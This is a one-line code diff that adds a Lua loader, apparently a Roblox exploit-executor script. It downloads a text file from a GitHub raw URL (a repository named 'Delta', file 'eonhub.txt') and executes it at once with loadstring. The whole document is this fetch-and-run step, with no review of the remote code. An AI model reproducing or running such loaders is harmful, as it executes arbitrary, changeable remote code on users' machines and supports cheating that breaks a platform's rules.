@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Yoogp/Delta/refs/heads/main/eonhub.txt"))()
